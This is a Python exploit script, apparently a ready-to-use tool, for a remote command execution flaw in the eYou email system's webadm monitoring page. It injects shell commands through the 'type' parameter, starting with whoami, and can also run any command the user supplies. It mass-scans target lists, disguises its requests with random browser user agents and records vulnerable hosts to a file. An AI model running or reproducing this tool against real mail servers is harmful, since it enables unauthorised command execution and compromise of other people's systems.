import re
import requests,sys,random,re,json,click,base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def info():
    print("[+]============================================================")
    print("[+] 亿邮电子邮件系统远程命令执行漏洞")
    print("[+] Explain: wendengyun")
    print("[+]============================================================")
    print("                                                               ")

#随机ua
def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua


# 漏洞利用poc
def exp1(url):
    target_url = url + "/webadm/?q=moni_detail.do&action=gragh"
    headers = {
        "User-Agent": get_ua(),
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
    }
    data = "type='|whoami||'"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=target_url, data=data, headers=headers, verify=False, timeout=10)
        if response.status_code == 200:
            dr = re.compile(r'<[^>]+>',re.S)
            dd = dr.sub('',response.text)
            dd = dd.strip('\n')
            print("\033[32m[+] 目标 {}存在漏洞,响应为:\n{}\033[0m".format(url,dd))
            with open('success.txt', 'a', encoding='utf8') as vul:
                vul.write(url+'\n')
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(url))

# 对单个url进行验证
def scan1(url):
    exp1(str(url))


# 批量漏洞验证
def scan2(file):
    with open(file, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
                url = url.strip('\n')
            try:
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                req = requests.get(url=url, verify=False, timeout=10)
                if req.status_code == 200:
                    print("\033[32m[+] 正在请求{}".format(url))
                    exp1(url)
            except:
                pass
            try:
                url = url.replace("http","https")
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                req = requests.get(url=url, verify=False, timeout=10)
                if req.status_code == 200:
                    print("\033[32m[+] 正在请求{}".format(url))
                    exp1(url)
            except:
                pass
# 命令执行
def command(url, cmd):
    target_url = url + "/webadm/?q=moni_detail.do&action=gragh"
    headers = {
        "User-Agent": get_ua(),
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }
    data = "type='|"+cmd+"||'"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=target_url, data=data, headers=headers, verify=False, timeout=10)
        if response.status_code == 200:
            dr = re.compile(r'<[^>]+>',re.S)
            dd = dr.sub('',response.text)
            dd = dd.strip('\n')
            print("\033[32m[+] 目标 {}存在漏洞,响应为:\n{}\033[0m".format(url,dd))
        else:
            print("\033[31m[x]目标 {}不存在漏洞 \033[0m".format(url))
    except Exception as e:
        print("\033[31m[x]目标 {} 请求失败 \033[0m".format(url))


@click.command()
@click.option("-u", "--url", help='Target URL，对单一目标检测; Example:python3 EYouMailRCE.py -u https://ip:port')
@click.option("-f", "--file", help="Target File，对批量目标检测; Example:python3 EYouMailRCE.py -f ip.txt")
@click.option("-c", "--cmd", help="Target command，命令执行; Example: python3 EYouMailRCE.py -cmd id")
def main(url,file,cmd):
    info()
    if url != None and file == None and cmd ==None:
        scan1(url)
    elif url == None and file != None and cmd ==None:
        scan2(file)
    elif url != None and file == None and cmd !=None:
        command(url, cmd)
    else:
        print("python3 EYouMailRCE.py --help")

if __name__ == '__main__':
    main()
